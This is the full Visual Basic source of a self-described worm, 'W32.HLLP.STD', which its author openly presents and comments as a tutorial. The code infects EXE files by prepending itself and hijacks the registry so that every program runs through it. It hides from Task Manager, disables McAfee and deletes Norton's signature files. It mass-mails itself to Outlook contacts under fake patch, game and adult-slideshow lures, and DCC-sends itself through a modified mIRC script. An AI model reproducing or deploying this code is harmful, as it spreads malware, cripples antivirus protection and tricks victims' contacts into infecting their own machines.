Attribute VB_Name = "STD"
'STD v1.0 by Error of Team Necrosis
' Commented by Error, pardon my commenting style
' ********W32.HLLP.STD.worm Source*********
' STD is a Memory-Resident EXE prepender with
' Worm functions for Outlook and mIRC
Public myDNA, myRNA, MyCode, STD, Grime, MySTD As String
Public FDateTime, oldDate, FDate, OldTime, FTime As String
Const MySize = 17920
Const RSP_SIMPLE_SERVICE = 1
Const RSP_UNREGISTER_SERVICE = 0
Private iResult, hProg, idprog, iExit As Long
Const STILL_ACTIVE As Long = &H103
Const PROCESS_ALL_ACCESS As Long = &H1F0FFF
Const Notification = "Hey, sorry I haven't written to you in a while.  " & _
                            "Well you could call it a while.  I'm writing this E-mail " & _
                            "to let you know of an attachment im sending with the next mail."
Const Notify = "Here is the e-mail attachment I told you about earlier, " & _
                        "It's an installation program for "
Private Declare Function GetCurrentProcessId Lib "kernel32" () As Long
Private Declare Function RegisterServiceProcess Lib "kernel32" (ByVal dwProcessID As Long, ByVal dwType As Long) As Long
Private Declare Function OpenProcess Lib "kernel32" (ByVal dwDesiredAccess As Long, ByVal bInheritHandle As Long, ByVal dwProcessID As Long) As Long
Private Declare Function GetExitCodeProcess Lib "kernel32" (ByVal hProcess As Long, lpExitCode As Long) As Long
Private Declare Function CloseHandle Lib "kernel32" (ByVal hObject As Long) As Long
Sub Form_Load()
' I put STD into a form because if you compile
' it into a module you wont be able to chose
' what default icon STD will have, and it ends
' up with a nasty baby blue and white form.
' Which is very noticable since STD's icon
' becomes the infected EXE's icon.  i then made
' the MS-DOS Program Icon as the default icon

' NOTE: Make sure you make the form set to
' visbile = false and showintaskbar = false

On Error Resume Next
Dim process As Long
process = GetCurrentProcessId()
' This gets STD's process handle so it can
' manipulate itself
Call RegisterServiceProcess(process, RSP_SIMPLE_SERVICE)
' Now STD is hidden from ALT+CTRL+DEL and
' Task Manager.  This will take up kernel
' processing up to 99.9%  but it will allocate
' any needed kernel processing for other
' programs and still remain hidden.
Call AIDS
' AIDS = Registry Modifications to disable
' McAfee/Norton, have STD startup on windows
' load, make STD go memory-resident, and to
' modify mIRC scripting
myDNA = App.EXEName
If Right(App.Path, 1) <> "\" Then
    myRNA = App.Path & "\"
End If
' The above will get the present filename of
' STD's host which has been executed
myRNA = myRNA & myDNA & ".exe"
' ************MEMORY-RESIDENT AREA***********
If UCase(myRNA) = "C:\WINDOWS\SYSTEM\SYSTRAY_.EXE" Then
' STD places its code into the file:
' C:\WINDOWS\SYSTEM\SYSTRAY_.EXE
' This is called the Exe-Hooker (yes i said
' hooker).  Whenever a exe is executed this file
' will be executed first, sending the running
' exe's full pah name and parameters to this
' files commandline
    STD = Command()
' Get the running exe's path name and parameters
    For X = 1 To Len(STD)
        strck = UCase(Mid(STD, X, 1))
        Grime = Grime + strck
        If Right(Grime, 5) = ".EXE " Then
' Extract the exe name from the parameters
            Grime = Left(Grime, Len(Grime) - 1)
            MySTD = Right$(STD, Len(STD) - X)
' Grime = full path of the running exe
' MySTD = all the exe's parameters
            GoTo Trine
        End If
    Next X
Trine:
    ff = FreeFile
' use freefiles so you dont get file i/o errors
    FDateTime = FileDateTime(Grime)
' Get the files Date/Time Stamp
    For w = 1 To Len(FDateTime)
        Scan = Mid(FDateTime, w, 1)
        If Scan = " " Then
            FDate = FDate + Scan
' Extract the Time
            FTime = Mid(FDateTime, w + 1, Len(FDateTime) - w)
            GoTo GotStamp
        End If
' Extract the Date
        FDate = FDate + Scan
    Next w
GotStamp:
    oldDate = Date$
' Get and store the original system date
    OldTime = Time$
' Get and store the original system time
    Date = FDate
' Change the system Date to the files date
    Time = FTime
' Change the system Time to the files time
' This will keep the file's date/time stamp
' preserved (Is this a first for a VB virus?)
    Open Grime For Binary Access Read As ff
' Open the running exe
        Dim Original As String
        Original = Space(LOF(ff))
' set a buffer to include the entire exe file's
' contents (I've seen exe's 126 meg being stored
' as a string in VB)
        Get #ff, 1, Original
' Start at the beginning of the file and get the
' entire contents of the file
        If UCase(Right(Original, 3)) = "STD" Then
' After getting the contents, check to see if
' the last 3 characters in a file are "STD"
' if so, that means the file is already infected
' and the original file needs to be ran ASAP
            Call Original_Jump
' Original_Jump = run the original exe
        End If
    Close #ff
' if the file isnt infected:
    Open myRNA For Binary Access Read As #2
' open the Exe hooker file
        Dim Herpes As String
        Herpes = Space(MySize)
        Get #2, 1, Herpes
' Get the virus from the file
    Close #2
    Open Grime For Binary Access Write As ff
        Put #ff, 1, Herpes
' Place the virus at the beginning of the Exe
        Put #ff, MySize, Original
' Right after STD, place the original Exe code
        Put #ff, LOF(ff) + 3, "STD"
' Mark the file infected with "STD" as the last
' 3 characters in a file
    Close #ff
    Call Original_Jump
' Run the original exe
End If
' ********END OF MEMORY-RESIDENT CODE*********
InFx_SYS
' InFx_SYS starts the infection of the system
' and makes STD go resident
End Sub
Public Sub InFx_SYS()
On Error Resume Next
Kill "C:\windows\system\systray_.exe"
' Kill any non-working installations
ff = FreeFile
Open myRNA For Binary Access Read As #ff
' Open the running file
    Dim MyCode As String
    MyCode = Space(MySize)
    Get #ff, 1, MyCode
' Extract STD from the file
Close
Open "C:\windows\system\systray_.exe" For Binary Access Write As #ff
    Put #ff, 1, MyCode
' Place STD in the Exe Hooker file
    Put #ff, LOF(ff) + 3, "STD"
' Mark the file infected so it wont infect
' itself
Close
FileCopy "C:\windows\system\systray_.exe", "C:\windows\system\runtray_.dll"
' copy the Exe Hooker file to another file for
' mailing purposes
Call Original_Jump
' Run the original exe
End Sub
Public Sub AIDS()
' This modifies windows registry, disables AV
' products and mIRC sending stuff
' NOTE: this is ran every exe execution as well
On Error Resume Next
w = Chr(34)
' for saving space (And lots of it)
Open "C:\ModReg.reg" For Output As #1
    Print #1, "REGEDIT4"
    Print #1,
    Print #1, "[HKEY_CLASSES_ROOT\exefile\shell\open\command]"
    Print #1, "@=" & w & "\" & w & "C:\\windows\\system\\systray_.exe\" & w & " %1 %*" & w
' Most important command of STD is above
' This forces Windows to run all exe's through
' STD's Exe Hooker file along with their
' parameters.  Once windows is restarted after
' system infection, STD will go into hardend
' residency.  Windows will depend on the Exe
' Hooker to run all exe's and therefore STD
' cannot be deleted in a windows session.  And
' if they delete it in DOS, no exes will run
' until the rewrite the registry
    Print #1,
    Print #1, "[HKEY_LOCAL_MACHINE\Software\McAfee\Scan95]"
    Print #1, w & "SerialNum" & w & "=" & w & "STD v1.0 by Error of TN" & w
    Print #1, w & "CurrentVersionNumber" & w & "=" & w & "666" & w
    Print #1, w & "DAT" & w & "=" & w & "NONE" & w
    Print #1, w & "DATFile" & w & "=" & w & "-2000" & w
    Print #1, w & "VirusInfoURL" & w & "=" & w & "http://www.norton.com" & w
    Print #1, w & "bVShieldEnabled" & w & "=dword:00000000"
' Disable McAfee's scanner, DAT files, and
' VShield
    Print #1,
    Print #1, "[HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run]"
    Print #1, w & "SystemTray" & w & "=" & w & "C:\\Windows\\system\\systray_.exe" & w
' Start STD on every windows startup
Close #1
If Dir("C:\mirc", vbDirectory) <> "" Then
    Open "C:\mirc\script.ini" For Output As #1
' Modify script.ini for STD sending
        Print #1, "[script]"
        Print #1, "n0= on 1:TEXT:*sex*:#:{"
' Everytime someone types in sex, sexy, etc
' in a Channel...
        Print #1, "n1= .msg $nick Hello, sorry to disturb you, but I just got a very kinky adult slideshow and was wondering if you would like a copy.  So I'm going to send you one."
' STD will message them with this...
        Print #1, "n2= .copy C:\windows\system\runtray_.dll C:\windows\system\install_show.exe"
' rename the mailing file to this false name
        Print #1, "n3= .dcc send $nick C:\windows\system\install_show.exe"
' and DCC send it to the person who typed in sex
' BTW 'sex' is the 2nd most common subject/word
' typed in chats (right after a/s/l)
        Print #1, "n4= }"
' end the mIRC sending stuff
    Close
End If
modify = Shell("regedit /s C:\ModReg.reg", vbHide)
' run the Registry modifications in a background
' process
Kill "C:\ModReg.reg"
' delete any of its traces
Kill "C:\Program Files\Norton AntiVirus\*.dat"
' delete Norton's DAT files
End Sub
Public Function IGotWyrms(Subject1 As String, Body1 As String, Optional Attachment1 As String)
On Error Resume Next
' MAPI Mailing technique got from my other virus
' W97M/Revolution
' http://teamnecrosis.20m.com/VC.html for stuff
Dim S_and_M, B_and_D, Spawnme
Set S_and_M = CreateObject("Outlook.Application")
Set B_and_D = S_and_M.GetNameSpace("MAPI")
If S_and_M = "Outlook" Then
    B_and_D.Logon "Guest", "password"
    For y = 1 To B_and_D.AddressLists.Count
' get # of addybooks in Outlook
    Set AddyBook = B_and_D.AddressLists(y)
    X = 1
    Set Spawnme = S_and_M.CreateItem(0)
    For oo = 1 To AddyBook.AddressEntries.Count
        peep = AddyBook.AddressEntries(X)
        Spawnme.Recipients.Add peep
        X = X + 1
        If X > 100 Then oo = AddyBook.AddressEntries.Count
' in each Addybook send STD to the first 100 ppl
            Next oo
            Spawnme.Subject = Subject1
' Subject1 = "Hey" (on authorization mail) or
' "Here it is" (on Attachment mail)
            Spawnme.Body = Body1
' the body varies.... see Original_Jump
        If Attachment1 <> "" Then
                Spawnme.Attachments.Add Attachment1
' as above
        End If
            Spawnme.Send
            peep = ""
        Next y
        B_and_D.Logoff
    End If
End Function
Public Sub Original_Jump()
On Error Resume Next
If Grime = "" Or Grime = Empty Then Grime = myRNA
' make sure STD gets the file to run
If Original = "" Or Original = Empty Then
    Open Grime For Binary Access Read As #3
        Original = LOF(3) - MySize
        If Original = 0 Then End
' if the file = pure source of STD then end
        Dim GetOrig As String
        GetOrig = Space(Original)
        Get #3, MySize, GetOrig
' get the original code of the running exe
    Close #3
End If
hideit = Left(Grime, Len(Grime) - 4)
hideit = hideit & ".vxv"
Open hideit For Binary Access Write As #10
    Put #10, , GetOrig
' place the code in a temporary file with the
' same exe name but ".vxv" extension
Close #10
Close
Dim idprog As Long
Date = oldDate
Time = OldTime
' Restore system date/time if needed
idprog = Shell(hideit & " " & MySTD, vbNormalFocus)
' run the original exe AND its parameters via
' running the original code from a temporary
' file
hProg = OpenProcess(PROCESS_ALL_ACCESS, False, idprog)
GetExitCodeProcess hProg, iExit
Do While iExit = STILL_ACTIVE
    DoEvents
    GetExitCodeProcess hProg, iExit
' monitor the running exe from the temp file
' and have STD remain resident using 2K bytes
' of memory to run.  This is what prohibits
' STD from being deleted in a Windows session
' along with windows requiring that file
Loop
Kill hideit
Kill hideit
' As soon as the program has ended delete the
' temp file (2 times to ensure deletion)
Randomize Timer
' Base random number gen on the time
RandSend = Int(Rnd(1) * 20) + 1
If RandSend = 5 Then

' NOTE: to view mail messages see the
' declarations at the top of STD's code

' STD will send itself via Outlook 1 out of 20
' exe executions upon the infected machine
        Call IGotWyrms("Hey", Notification, "")
' send the authorization mail telling all users
' that the next E-mail will have an attachment
' "Social engineering at its finest" - Evul
        Name "C:\windows\system\runtray_.dll" As "C:\windows\install_.exe"
' rename the mail file to a fake name
        Randomize Timer
        Dim Note As String
        randmsg = Int(Rnd(1) * 5) + 1
        If randmsg = 1 Then Note = Notify & "an adult screensaver slideshow program"
        If randmsg = 2 Then Note = Notify & "an Outlook Service Release upgrade"
        If randmsg = 3 Then Note = Notify & "a Microsoft Explorer Patch"
        If randmsg = 4 Then Note = Notify & "a Desktop Game I got off the internet"
        If randmsg = 5 Then Note = Notify & "a brand-new MP3 player and plug-ins"
        Call IGotWyrms("Here it is", Note, "C:\windows\install_.exe")
' STD will send itself disguised as one of the
' above programs
        Name "C:\windows\install_.exe" As "C:\windows\system\runtray_.dll"
' rename the fake exe to the original fake name
    End If
End If
End
' End STD
' W32.HLLP.STD.worm by Error of Team Necrosis
' 32-bit exe infector/worm with a hint of social
' engineering
' One of the first Memory-Resident Exe infectors
' written in Visual Basic
' questions? ---> FatalError@ghostmail.com
' http://teamnecrosis.20m.com
End Sub


